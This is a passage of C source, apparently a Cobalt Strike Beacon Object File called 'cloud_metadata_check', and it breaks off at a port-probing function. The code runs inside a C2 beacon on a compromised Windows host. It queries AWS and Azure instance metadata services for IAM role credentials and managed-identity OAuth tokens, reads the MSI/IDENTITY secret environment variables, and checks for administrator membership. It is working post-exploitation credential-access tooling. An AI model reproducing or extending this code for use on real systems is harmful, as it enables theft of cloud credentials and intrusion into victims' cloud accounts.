#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stddef.h>
#include "beacon.h"

#ifndef CALLBACK_OUTPUT
#define CALLBACK_OUTPUT      0x0
#endif
#ifndef CALLBACK_ERROR
#define CALLBACK_ERROR       0x0d
#endif

#ifndef WINHTTP_ACCESS_TYPE_NO_PROXY
#define WINHTTP_ACCESS_TYPE_NO_PROXY       1
#endif
#ifndef WINHTTP_QUERY_STATUS_CODE
#define WINHTTP_QUERY_STATUS_CODE          19
#endif
#ifndef WINHTTP_QUERY_FLAG_NUMBER
#define WINHTTP_QUERY_FLAG_NUMBER          0x20000000
#endif
#ifndef WINHTTP_QUERY_WWW_AUTHENTICATE
#define WINHTTP_QUERY_WWW_AUTHENTICATE     40
#endif
#ifndef INTERNET_DEFAULT_HTTP_PORT
#define INTERNET_DEFAULT_HTTP_PORT         80
#endif

#define AF_INET           2
#define SOCK_STREAM       1
#define IPPROTO_TCP       6
#define INVALID_SOCKET    ((SOCKET)(~0ULL))
#define SOCKET_ERROR      (-1)
#define FIONBIO           0x8004667E
#define INADDR_NONE       0xFFFFFFFF
#ifndef WSAEWOULDBLOCK
#define WSAEWOULDBLOCK    10035
#endif
#define SOL_SOCKET        0xFFFF
#define SO_ERROR          0x1007
#ifndef MAKEWORD
#define MAKEWORD(a,b)     ((WORD)(((BYTE)(a)) | ((WORD)((BYTE)(b))) << 8))
#endif
#ifndef WSAAPI
#define WSAAPI            __stdcall
#endif

#define IMDS_BODY_MAX     512
#define AZURE_COMPUTE_MAX 1024
#define HIMDS_BODY_MAX    2048
#define WIRE_BODY_MAX     2048
#define AWS_TOKEN_MAX     128
#define CONTEXT_MAX       128
#define ROLE_MAX          64
#define HDR_WCHAR_MAX     384
#define APP_ENDPOINT_MAX  256
#define APP_SECRET_MAX    128
#define APP_HOST_MAX      128
#define APP_HOSTPORT_MAX  160
#define APP_PATH_MAX      384
#define HIMDS_AUTH_MAX    384
#define HIMDS_CHALLENGE_MAX 256
#define AUD_RESOURCE_MAX  192
#define AUD_LABEL_MAX     16
#define SNIP_KEY_ID       24
#define SNIP_SECRET       32
#define SNIP_TOKEN        32
#define SNIP_CONTEXT      96
#define SNIP_URL          120
#define WIRE_EXT_MAX      5
#define WIRE_COUNT_MAX    8
#ifndef SECURITY_MAX_SID_SIZE
#define SECURITY_MAX_SID_SIZE 68
#endif
#ifndef TOKEN_QUERY
#define TOKEN_QUERY       0x0008
#endif
#define WIN_BUILTIN_ADMINISTRATORS_SID 26

#define AZURE_INSTANCE_PATH L"/metadata/instance?api-version=2025-04-07"
#define AZURE_COMPUTE_PATH  L"/metadata/instance/compute?api-version=2025-04-07"
#define AZURE_NETWORK_PATH  L"/metadata/instance/network?api-version=2025-04-07"
#define HIMDS_INSTANCE_PATH L"/metadata/instance?api-version=2020-06-01"
#define HIMDS_IDENTITY_PATH L"/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://management.azure.com/"

typedef unsigned short     u_short;
typedef unsigned long      u_long;
typedef unsigned long long SOCKET;

typedef struct {
    WORD   wVersion;
    WORD   wHighVersion;
    char   szDescription[257];
    char   szSystemStatus[129];
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char  *lpVendorInfo;
} WSADATA_BOF, *LPWSADATA_BOF;

typedef struct {
    short          sin_family;
    unsigned short sin_port;
    struct {
        union {
            unsigned long S_addr;
        } S_un;
    } sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN_BOF;

typedef struct {
    long tv_sec;
    long tv_usec;
} TIMEVAL_BOF;

typedef struct {
    unsigned int fd_count;
    SOCKET       fd_array[1];
} FD_SET_BOF;

#define FD_ZERO_BOF(s)          do { (s)->fd_count = 0; (s)->fd_array[0] = 0; } while(0)
#define FD_SET1_BOF(sk, s)      do { (s)->fd_array[0] = (sk); (s)->fd_count = 1; } while(0)

typedef void *HINTERNET;
typedef unsigned short INTERNET_PORT;

static char g_azure_compute_body[AZURE_COMPUTE_MAX];
static char g_himds_body[HIMDS_BODY_MAX];
static char g_wire_body[WIRE_BODY_MAX];
static wchar_t g_app_host[APP_HOST_MAX];
static wchar_t g_app_base_path[APP_PATH_MAX];
static wchar_t g_app_token_path[APP_PATH_MAX];
static wchar_t g_app_hdrs[HDR_WCHAR_MAX];
static char g_app_hostport[APP_HOSTPORT_MAX];
static char g_app_body[IMDS_BODY_MAX];
static wchar_t g_identity_path[APP_PATH_MAX];
static char g_identity_body[IMDS_BODY_MAX];
static wchar_t g_himds_auth[HIMDS_AUTH_MAX];
static wchar_t g_himds_challenge_path[APP_PATH_MAX];
static char g_himds_challenge[HIMDS_CHALLENGE_MAX];
static char g_audience_resource[AUD_RESOURCE_MAX];
static char g_audience_label[AUD_LABEL_MAX];

DECLSPEC_IMPORT void    WINAPI BeaconDataParse(datap *parser, char *buffer, int size);
DECLSPEC_IMPORT char *  WINAPI BeaconDataExtract(datap *parser, int *size);
DECLSPEC_IMPORT int     WINAPI BeaconDataLength(datap *parser);
DECLSPEC_IMPORT void    WINAPI BeaconPrintf(int type, char *fmt, ...);

DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR name,
    LPSTR buf, DWORD size);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR fileName,
    DWORD access, DWORD shareMode, LPSECURITY_ATTRIBUTES security,
    DWORD creation, DWORD flags, HANDLE templateFile);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE file, LPVOID buffer,
    DWORD toRead, LPDWORD read, LPOVERLAPPED overlapped);

DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE process,
    DWORD access, PHANDLE token);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$CheckTokenMembership(HANDLE token,
    PSID sid, PBOOL isMember);
DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$CreateWellKnownSid(int sidType,
    PSID domainSid, PSID sid, DWORD *sidSize);

DECLSPEC_IMPORT int     WSAAPI WS2_32$WSAStartup(WORD wVer, LPWSADATA_BOF lpWSAData);
DECLSPEC_IMPORT int     WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT SOCKET  WSAAPI WS2_32$socket(int af, int type, int proto);
DECLSPEC_IMPORT int     WSAAPI WS2_32$connect(SOCKET s, const void *name, int namelen);
DECLSPEC_IMPORT int     WSAAPI WS2_32$closesocket(SOCKET s);
DECLSPEC_IMPORT int     WSAAPI WS2_32$select(int nfds, FD_SET_BOF *r, FD_SET_BOF *w,
                                              FD_SET_BOF *e, const TIMEVAL_BOF *tv);
DECLSPEC_IMPORT int     WSAAPI WS2_32$ioctlsocket(SOCKET s, long cmd, u_long *argp);
DECLSPEC_IMPORT int     WSAAPI WS2_32$getsockopt(SOCKET s, int level, int optname,
                                                  char *optval, int *optlen);
DECLSPEC_IMPORT int     WSAAPI WS2_32$WSAGetLastError(void);
DECLSPEC_IMPORT u_long  WSAAPI WS2_32$inet_addr(const char *cp);
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short hostshort);

DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpen(LPCWSTR agent, DWORD access,
    LPCWSTR proxy, LPCWSTR bypass, DWORD flags);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpConnect(HINTERNET hSession,
    LPCWSTR host, INTERNET_PORT port, DWORD reserved);
DECLSPEC_IMPORT HINTERNET WINAPI WINHTTP$WinHttpOpenRequest(HINTERNET hConn,
    LPCWSTR verb, LPCWSTR path, LPCWSTR version, LPCWSTR referrer,
    LPCWSTR *types, DWORD flags);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSendRequest(HINTERNET hReq,
    LPCWSTR headers, DWORD hdrsLen, LPVOID optional, DWORD optLen,
    DWORD totalLen, DWORD_PTR ctx);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReceiveResponse(HINTERNET hReq,
    LPVOID reserved);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpQueryHeaders(HINTERNET hReq,
    DWORD level, LPCWSTR name, LPVOID buf, LPDWORD bufLen, LPDWORD idx);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpReadData(HINTERNET hReq,
    LPVOID buf, DWORD toRead, LPDWORD bytesRead);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpCloseHandle(HINTERNET h);
DECLSPEC_IMPORT BOOL WINAPI WINHTTP$WinHttpSetTimeouts(HINTERNET h,
    int resolve, int connect, int send, int recv);

static void *inline_memset(void *dst, int val, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)val;
    return dst;
}

static void clear_sensitive_state(void) {
    inline_memset(g_azure_compute_body, 0, sizeof(g_azure_compute_body));
    inline_memset(g_himds_body, 0, sizeof(g_himds_body));
    inline_memset(g_wire_body, 0, sizeof(g_wire_body));
    inline_memset(g_app_host, 0, sizeof(g_app_host));
    inline_memset(g_app_base_path, 0, sizeof(g_app_base_path));
    inline_memset(g_app_token_path, 0, sizeof(g_app_token_path));
    inline_memset(g_app_hdrs, 0, sizeof(g_app_hdrs));
    inline_memset(g_app_hostport, 0, sizeof(g_app_hostport));
    inline_memset(g_app_body, 0, sizeof(g_app_body));
    inline_memset(g_identity_path, 0, sizeof(g_identity_path));
    inline_memset(g_identity_body, 0, sizeof(g_identity_body));
    inline_memset(g_himds_auth, 0, sizeof(g_himds_auth));
    inline_memset(g_himds_challenge_path, 0, sizeof(g_himds_challenge_path));
    inline_memset(g_himds_challenge, 0, sizeof(g_himds_challenge));
    inline_memset(g_audience_resource, 0, sizeof(g_audience_resource));
    inline_memset(g_audience_label, 0, sizeof(g_audience_label));
}

static size_t str_len(const char *s) {
    size_t n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static int arg_equals_literal_i(const char *arg, int arg_len, const char *literal) {
    int start = 0;
    int end;
    size_t lit_len;
    size_t i;

    if (!arg || arg_len <= 0 || !literal) return 0;

    end = arg_len;
    while (end > 0 && arg[end - 1] == '\0') end--;
    while (start < end && (arg[start] == ' ' || arg[start] == '\t'
           || arg[start] == '\r' || arg[start] == '\n')) {
        start++;
    }
    while (end > start && (arg[end - 1] == ' ' || arg[end - 1] == '\t'
           || arg[end - 1] == '\r' || arg[end - 1] == '\n')) {
        end--;
    }

    lit_len = str_len(literal);
    if ((size_t)(end - start) != lit_len) return 0;

    for (i = 0; i < lit_len; i++) {
        char ca = arg[start + (int)i];
        char cb = literal[i];
        if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
        if (cb >= 'A' && cb <= 'Z') cb = (char)(cb + 32);
        if (ca != cb) return 0;
    }
    return 1;
}

static int arg_has_content(const char *arg, int arg_len) {
    int i;
    if (!arg || arg_len <= 0) return 0;
    for (i = 0; i < arg_len; i++) {
        if (arg[i] == '\0') return 0;
        if (arg[i] != ' ' && arg[i] != '\t' && arg[i] != '\r' && arg[i] != '\n') {
            return 1;
        }
    }
    return 0;
}

static void print_usage(void) {
    BeaconPrintf(CALLBACK_ERROR,
        "[-] Usage: cloud_metadata_check [presence] [-aud arm|graph|other:<resource>|other <resource>]\n");
}

static void ascii_copy(char *dst, size_t dst_max, const char *src) {
    size_t i = 0;
    if (!dst || dst_max == 0) return;
    dst[0] = '\0';
    if (!src) return;
    while (src[i] && i < dst_max - 1) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
}

static int arg_copy_trimmed(char *dst, size_t dst_max, const char *arg, int arg_len) {
    int start = 0;
    int end;
    size_t out = 0;

    if (!dst || dst_max < 2 || !arg || arg_len <= 0) return 0;
    dst[0] = '\0';

    end = arg_len;
    while (end > 0 && arg[end - 1] == '\0') end--;
    while (start < end && (arg[start] == ' ' || arg[start] == '\t'
           || arg[start] == '\r' || arg[start] == '\n')) {
        start++;
    }
    while (end > start && (arg[end - 1] == ' ' || arg[end - 1] == '\t'
           || arg[end - 1] == '\r' || arg[end - 1] == '\n')) {
        end--;
    }

    while (start < end && out < dst_max - 1) {
        char ch = arg[start++];
        if (ch == '\0') break;
        dst[out++] = ch;
    }
    dst[out] = '\0';
    return out > 0 ? 1 : 0;
}

static int arg_starts_literal_i(const char *arg, int arg_len, const char *literal) {
    int start = 0;
    int end;
    size_t lit_len;
    size_t i;

    if (!arg || arg_len <= 0 || !literal) return 0;

    end = arg_len;
    while (end > 0 && arg[end - 1] == '\0') end--;
    while (start < end && (arg[start] == ' ' || arg[start] == '\t'
           || arg[start] == '\r' || arg[start] == '\n')) {
        start++;
    }

    lit_len = str_len(literal);
    if ((size_t)(end - start) < lit_len) return 0;

    for (i = 0; i < lit_len; i++) {
        char ca = arg[start + (int)i];
        char cb = literal[i];
        if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
        if (cb >= 'A' && cb <= 'Z') cb = (char)(cb + 32);
        if (ca != cb) return 0;
    }
    return 1;
}

static void set_default_audience(void) {
    ascii_copy(g_audience_label, AUD_LABEL_MAX, "arm");
    ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, "https://management.azure.com/");
}

static int set_audience_from_arg(const char *arg, int arg_len,
                                 const char *extra, int extra_len) {
    char tmp[AUD_RESOURCE_MAX];

    inline_memset(tmp, 0, sizeof(tmp));

    if (arg_equals_literal_i(arg, arg_len, "arm")
        || arg_equals_literal_i(arg, arg_len, "management")) {
        ascii_copy(g_audience_label, AUD_LABEL_MAX, "arm");
        ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, "https://management.azure.com/");
        return 1;
    }

    if (arg_equals_literal_i(arg, arg_len, "graph")
        || arg_equals_literal_i(arg, arg_len, "msgraph")) {
        ascii_copy(g_audience_label, AUD_LABEL_MAX, "graph");
        ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, "https://graph.microsoft.com/");
        return 1;
    }

    if (arg_starts_literal_i(arg, arg_len, "other:")) {
        if (!arg_copy_trimmed(tmp, sizeof(tmp), arg, arg_len)) return 0;
        if (!tmp[6]) return 0;
        ascii_copy(g_audience_label, AUD_LABEL_MAX, "other");
        ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, tmp + 6);
        inline_memset(tmp, 0, sizeof(tmp));
        return 1;
    }

    if (arg_equals_literal_i(arg, arg_len, "other")) {
        if (!arg_copy_trimmed(tmp, sizeof(tmp), extra, extra_len)) return 0;
        ascii_copy(g_audience_label, AUD_LABEL_MAX, "other");
        ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, tmp);
        inline_memset(tmp, 0, sizeof(tmp));
        return 1;
    }

    if (arg_starts_literal_i(arg, arg_len, "http://")
        || arg_starts_literal_i(arg, arg_len, "https://")) {
        if (!arg_copy_trimmed(tmp, sizeof(tmp), arg, arg_len)) return 0;
        ascii_copy(g_audience_label, AUD_LABEL_MAX, "other");
        ascii_copy(g_audience_resource, AUD_RESOURCE_MAX, tmp);
        inline_memset(tmp, 0, sizeof(tmp));
        return 1;
    }

    return 0;
}

static int str_starts_i(const char *s, const char *prefix) {
    if (!s || !prefix) return 0;
    while (*prefix) {
        char cs = *s;
        char cp = *prefix;
        if (cs >= 'A' && cs <= 'Z') cs = (char)(cs + 32);
        if (cp >= 'A' && cp <= 'Z') cp = (char)(cp + 32);
        if (cs != cp) return 0;
        s++;
        prefix++;
    }
    return 1;
}

static const char *find_substr(const char *s, const char *needle) {
    size_t nlen;
    if (!s || !needle) return NULL;
    nlen = str_len(needle);
    if (nlen == 0) return s;
    while (*s) {
        size_t i = 0;
        while (needle[i] && s[i] && needle[i] == s[i]) i++;
        if (i == nlen) return s;
        s++;
    }
    return NULL;
}

static int str_contains_i(const char *s, const char *needle) {
    size_t nlen;
    if (!s || !needle) return 0;
    nlen = str_len(needle);
    if (nlen == 0) return 1;
    while (*s) {
        size_t i = 0;
        while (needle[i] && s[i]) {
            char cs = s[i];
            char cn = needle[i];
            if (cs >= 'A' && cs <= 'Z') cs = (char)(cs + 32);
            if (cn >= 'A' && cn <= 'Z') cn = (char)(cn + 32);
            if (cs != cn) break;
            i++;
        }
        if (i == nlen) return 1;
        s++;
    }
    return 0;
}

static void ascii_append_char(char *dst, size_t dst_max, char ch) {
    size_t pos;
    if (!dst || dst_max == 0) return;
    pos = str_len(dst);
    if (pos < dst_max - 1) {
        dst[pos] = ch;
        dst[pos + 1] = '\0';
    }
}

static void ascii_append_uint(char *dst, size_t dst_max, unsigned int value) {
    char tmp[12];
    size_t n = 0;
    if (!dst || dst_max == 0) return;
    if (value == 0) {
        ascii_append_char(dst, dst_max, '0');
        return;
    }
    while (value > 0 && n < sizeof(tmp)) {
        tmp[n++] = (char)('0' + (value % 10));
        value /= 10;
    }
    while (n > 0) {
        ascii_append_char(dst, dst_max, tmp[--n]);
    }
}

static void trim_trailing_ws(char *s) {
    size_t n;
    if (!s) return;
    n = str_len(s);
    while (n > 0 && (s[n - 1] == '\r' || s[n - 1] == '\n' || s[n - 1] == ' ')) {
        s[n - 1] = '\0';
        n--;
    }
}

static void flatten_output_ws(char *s) {
    int in_ws = 0;
    size_t r = 0;
    size_t w = 0;
    if (!s) return;
    while (s[r]) {
        char ch = s[r++];
        int is_ws = (ch == '\r' || ch == '\n' || ch == '\t');
        if (is_ws) ch = ' ';
        if (ch == ' ') {
            if (in_ws) continue;
            in_ws = 1;
        } else {
            in_ws = 0;
        }
        s[w++] = ch;
    }
    s[w] = '\0';
    trim_trailing_ws(s);
}

static size_t wstr_len(const wchar_t *s) {
    size_t n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static void wstr_copy(wchar_t *dst, size_t dst_max, const wchar_t *src) {
    size_t i = 0;
    if (!dst || dst_max == 0) return;
    dst[0] = 0;
    if (!src) return;
    while (src[i] && i < dst_max - 1) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = 0;
}

static void wstr_append_ascii(wchar_t *dst, size_t dst_max, const char *ascii) {
    size_t pos;
    size_t i;
    if (!dst || !ascii || dst_max == 0) return;
    pos = wstr_len(dst);
    i = 0;
    while (ascii[i] && pos < dst_max - 1) {
        dst[pos++] = (wchar_t)(unsigned char)ascii[i++];
    }
    dst[pos] = 0;
}

static int wstr_has_char(const wchar_t *s, wchar_t ch) {
    if (!s) return 0;
    while (*s) {
        if (*s == ch) return 1;
        s++;
    }
    return 0;
}

static int wchar_equals_i(wchar_t a, wchar_t b) {
    if (a >= L'A' && a <= L'Z') a = (wchar_t)(a + 32);
    if (b >= L'A' && b <= L'Z') b = (wchar_t)(b + 32);
    return a == b;
}

static const wchar_t *wstr_find_i(const wchar_t *s, const wchar_t *needle) {
    if (!s || !needle || !needle[0]) return NULL;
    while (*s) {
        size_t i = 0;
        while (needle[i] && s[i] && wchar_equals_i(s[i], needle[i])) i++;
        if (!needle[i]) return s;
        s++;
    }
    return NULL;
}

static int query_env_value(const char *name, char *out, DWORD out_max) {
    DWORD got;
    if (!name || !out || out_max == 0) return 0;
    out[0] = '\0';
    got = KERNEL32$GetEnvironmentVariableA(name, out, out_max);
    if (got == 0 || got >= out_max) {
        out[0] = '\0';
        return 0;
    }
    return 1;
}

static int appservice_env_ready(char *endpoint, DWORD endpoint_max,
                                char *secret, DWORD secret_max) {
    int has_endpoint;
    int has_secret;
    if (!endpoint || !secret) return 0;

    has_endpoint = query_env_value("IDENTITY_ENDPOINT", endpoint, endpoint_max);
    has_secret = query_env_value("IDENTITY_HEADER", secret, secret_max);
    if (!has_endpoint) {
        has_endpoint = query_env_value("MSI_ENDPOINT", endpoint, endpoint_max);
    }
    if (!has_secret) {
        has_secret = query_env_value("MSI_SECRET", secret, secret_max);
    }
    return (has_endpoint && has_secret) ? 1 : 0;
}

static int parse_http_url_ascii(const char *url, wchar_t *host, size_t host_max,
                                INTERNET_PORT *port, wchar_t *path, size_t path_max,
                                char *hostport, size_t hostport_max) {
    const char *p;
    unsigned int parsed_port = 80;
    int saw_port = 0;
    size_t hi = 0;
    size_t pi = 0;

    if (!url || !host || host_max < 2 || !port || !path || path_max < 2
        || !hostport || hostport_max < 4) {
        return 0;
    }
    host[0] = 0;
    path[0] = 0;
    hostport[0] = '\0';

    if (!str_starts_i(url, "http://")) return 0;
    p = url + 7;
    while (*p && *p != ':' && *p != '/' && *p != '?' && hi < host_max - 1) {
        host[hi] = (wchar_t)(unsigned char)(*p);
        ascii_append_char(hostport, hostport_max, *p);
        hi++;
        p++;
    }
    host[hi] = 0;
    if (hi == 0) return 0;
    if (*p && *p != ':' && *p != '/' && *p != '?') return 0;

    if (*p == ':') {
        saw_port = 1;
        parsed_port = 0;
        ascii_append_char(hostport, hostport_max, ':');
        p++;
        while (*p >= '0' && *p <= '9') {
            unsigned int digit = (unsigned int)(*p - '0');
            if (parsed_port > 6553 || (parsed_port == 6553 && digit > 5)) {
                return 0;
            }
            parsed_port = (parsed_port * 10) + digit;
            ascii_append_char(hostport, hostport_max, *p);
            p++;
        }
        if (parsed_port == 0 || parsed_port > 65535) return 0;
    }
    if (!saw_port) {
        ascii_append_char(hostport, hostport_max, ':');
        ascii_append_uint(hostport, hostport_max, 80);
    }

    if (*p == '\0') {
        path[0] = L'/';
        path[1] = 0;
    } else {
        if (*p != '/' && *p != '?') return 0;
        if (*p == '?') {
            path[pi++] = L'/';
        }
        while (*p && pi < path_max - 1) {
            path[pi++] = (wchar_t)(unsigned char)(*p++);
        }
        path[pi] = 0;
        if (*p) return 0;
    }

    *port = (INTERNET_PORT)parsed_port;
    return 1;
}

static void build_appservice_token_path(wchar_t *dst, size_t dst_max,
                                        const wchar_t *base_path,
                                        const char *api_version,
                                        const char *resource) {
    const char *res;
    if (!dst || dst_max == 0) return;
    res = (resource && resource[0]) ? resource : "https://management.azure.com/";
    wstr_copy(dst, dst_max, base_path && base_path[0] ? base_path : L"/");
    if (wstr_has_char(dst, L'?')) {
        wstr_append_ascii(dst, dst_max, "&resource=");
    } else {
        wstr_append_ascii(dst, dst_max, "?resource=");
    }
    wstr_append_ascii(dst, dst_max, res);
    wstr_append_ascii(dst, dst_max, "&api-version=");
    wstr_append_ascii(dst, dst_max, api_version);
}

static void build_azure_identity_path(wchar_t *dst, size_t dst_max,
                                      int himds, const char *resource) {
    if (!dst || dst_max == 0) return;
    dst[0] = 0;
    if (himds) {
        wstr_copy(dst, dst_max,
            L"/metadata/identity/oauth2/token?api-version=2019-11-01&resource=");
    } else {
        wstr_copy(dst, dst_max,
            L"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=");
    }
    wstr_append_ascii(dst, dst_max,
        (resource && resource[0]) ? resource : "https://management.azure.com/");
}

static int body_mentions_multiple_uami(const char *body) {
    if (!body) return 0;
    if ((str_contains_i(body, "multiple") || str_contains_i(body, "more than one"))
        && (str_contains_i(body, "client_id")
            || str_contains_i(body, "clientid")
            || str_contains_i(body, "user assigned")
            || str_contains_i(body, "identity"))) {
        return 1;
    }
    return 0;
}

static void report_uami_selection_hint(const char *surface, int status,
                                       const char *body) {
    if (status == 400 && body_mentions_multiple_uami(body)) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] %s_uami: multiple user-assigned identities attached; specify client_id/resource_id for IMDS\n",
            surface ? surface : "azure");
    }
}

static void imds_build_headers(wchar_t *out, size_t out_max,
                               const wchar_t *extra, const char *aws_token) {
    if (!out || out_max == 0) return;
    out[0] = 0;
    if (extra) wstr_copy(out, out_max, extra);
    if (aws_token && aws_token[0]) {
        wstr_append_ascii(out, out_max, "X-aws-ec2-metadata-token: ");
        wstr_append_ascii(out, out_max, aws_token);
        wstr_append_ascii(out, out_max, "\r\n");
    }
}

static int imds_http_do(HINTERNET conn, const wchar_t *method, const wchar_t *path,
                        const wchar_t *extra_hdrs, const char *aws_token,
                        char *body, DWORD body_max, DWORD *body_read,
                        int *out_status) {
    HINTERNET req = NULL;
    wchar_t hdrs[HDR_WCHAR_MAX];
    DWORD status = 0;
    DWORD sz = sizeof(status);
    DWORD idx = 0;
    DWORD hdr_len;
    DWORD read_total = 0;
    int ok = 0;

    if (body_read) *body_read = 0;
    if (out_status) *out_status = 0;
    if (body && body_max > 0) body[0] = '\0';

    imds_build_headers(hdrs, HDR_WCHAR_MAX, extra_hdrs, aws_token);
    hdr_len = hdrs[0] ? (DWORD)(-1) : 0;

    req = WINHTTP$WinHttpOpenRequest(conn, method, path, NULL, NULL, NULL, 0);
    if (!req) goto cleanup;

    if (!WINHTTP$WinHttpSendRequest(req, hdrs[0] ? hdrs : NULL, hdr_len,
                                    NULL, 0, 0, 0)) {
        goto cleanup;
    }
    if (!WINHTTP$WinHttpReceiveResponse(req, NULL)) {
        goto cleanup;
    }

    WINHTTP$WinHttpQueryHeaders(req,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL, &status, &sz, &idx);

    if (body && body_max > 1) {
        while (read_total < body_max - 1) {
            DWORD chunk = 0;
            DWORD want = (body_max - 1) - read_total;
            if (!WINHTTP$WinHttpReadData(req, body + read_total, want, &chunk)) {
                break;
            }
            if (chunk == 0) break;
            read_total += chunk;
        }
        body[read_total] = '\0';
        trim_trailing_ws(body);
    }

    if (body_read) *body_read = read_total;
    if (out_status) *out_status = (int)status;
    ok = 1;

cleanup:
    if (req) WINHTTP$WinHttpCloseHandle(req);
    inline_memset(hdrs, 0, sizeof(hdrs));
    return ok;
}

static int imds_http_status(HINTERNET conn, const wchar_t *method, const wchar_t *path,
                            const wchar_t *extra_hdrs, const char *aws_token) {
    int status = 0;
    imds_http_do(conn, method, path, extra_hdrs, aws_token,
                 NULL, 0, NULL, &status);
    return status;
}

static int imds_http_read(HINTERNET conn, const wchar_t *method, const wchar_t *path,
                          const wchar_t *extra_hdrs, const char *aws_token,
                          char *buf, DWORD buf_max, DWORD *read_len, int *out_status) {
    return imds_http_do(conn, method, path, extra_hdrs, aws_token,
                        buf, buf_max, read_len, out_status);
}

static int aws_acquire_token(HINTERNET conn, char *token_buf, size_t token_max) {
    int status = 0;
    DWORD read_len = 0;

    if (!token_buf || token_max < 2) return 0;
    token_buf[0] = '\0';

    if (!imds_http_read(conn, L"PUT", L"/latest/api/token",
                        L"X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n",
                        NULL, token_buf, (DWORD)(token_max - 1), &read_len, &status)) {
        return 0;
    }
    if (status != 200 || read_len == 0) {
        token_buf[0] = '\0';
        return 0;
    }
    trim_trailing_ws(token_buf);
    return (token_buf[0] != '\0') ? 1 : 0;
}

static const char *json_field_value_ptr(const char *body, const char *key) {
    char needle[48];
    const char *p;
    size_t i;
    size_t ni;
    size_t klen;

    if (!body || !key) return NULL;

    klen = str_len(key);
    if (klen > 40) return NULL;

    inline_memset(needle, 0, sizeof(needle));
    needle[0] = '"';
    ni = 1;
    i = 0;
    while (key[i] && ni < sizeof(needle) - 4) {
        needle[ni++] = key[i++];
    }
    needle[ni++] = '"';
    needle[ni] = '\0';

    p = body;
    while (*p) {
        const char *n = needle;
        const char *b = p;
        while (*n && *b && *n == *b) {
            n++;
            b++;
        }
        if (*n == '\0') {
            while (*b == ' ' || *b == '\t' || *b == '\r' || *b == '\n') b++;
            if (*b != ':') {
                p++;
                continue;
            }
            b++;
            while (*b == ' ' || *b == '\t' || *b == '\r' || *b == '\n') b++;
            return b;
        }
        p++;
    }
    return NULL;
}

static int json_field_snip(const char *body, const char *key,
                           char *out, size_t out_max, size_t snip_max) {
    const char *v;
    size_t copied = 0;

    if (!body || !key || !out || out_max < 2 || snip_max == 0) return 0;
    out[0] = '\0';

    v = json_field_value_ptr(body, key);
    if (!v || *v != '"') return 0;
    v++;

    while (v[copied] && v[copied] != '"' && copied < snip_max && copied < out_max - 1) {
        out[copied] = v[copied];
        copied++;
    }
    out[copied] = '\0';
    return (copied > 0) ? 1 : 0;
}

static int json_field_value_snip(const char *body, const char *key,
                                 char *out, size_t out_max, size_t snip_max) {
    const char *v;
    size_t i = 0;
    size_t copied = 0;
    int depth = 0;
    int in_string = 0;
    int escaped = 0;

    if (!body || !key || !out || out_max < 2 || snip_max == 0) return 0;
    out[0] = '\0';

    v = json_field_value_ptr(body, key);
    if (!v) return 0;

    if (*v == '"') {
        v++;
        while (v[copied] && v[copied] != '"' && copied < snip_max && copied < out_max - 1) {
            out[copied] = v[copied];
            copied++;
        }
        out[copied] = '\0';
        return (copied > 0) ? 1 : 0;
    }

    while (v[i] && copied < snip_max && copied < out_max - 1) {
        char ch = v[i];

        if (in_string) {
            out[copied++] = ch;
            if (escaped) {
                escaped = 0;
            } else if (ch == '\\') {
                escaped = 1;
            } else if (ch == '"') {
                in_string = 0;
            }
            i++;
            continue;
        }

        if (ch == '"') {
            in_string = 1;
        } else if (ch == '{' || ch == '[') {
            depth++;
        } else if (ch == '}' || ch == ']') {
            if (depth > 0) depth--;
            out[copied++] = ch;
            i++;
            if (depth == 0) break;
            continue;
        } else if (depth == 0 && (ch == ',' || ch == '\r' || ch == '\n')) {
            break;
        }

        out[copied++] = ch;
        i++;
    }

    out[copied] = '\0';
    trim_trailing_ws(out);
    return (copied > 0) ? 1 : 0;
}

static void build_aws_cred_path(wchar_t *path, size_t path_max, const char *role) {
    size_t pos;
    size_t i;
    if (!path || path_max < 8 || !role) return;
    wstr_copy(path, path_max, L"/latest/meta-data/iam/security-credentials/");
    pos = wstr_len(path);
    i = 0;
    while (role[i] && pos < path_max - 1) {
        path[pos] = (wchar_t)(unsigned char)role[i];
        pos++;
        i++;
    }
    path[pos] = 0;
}

static int probe_tcp_port(const char *ip, u_short port) {
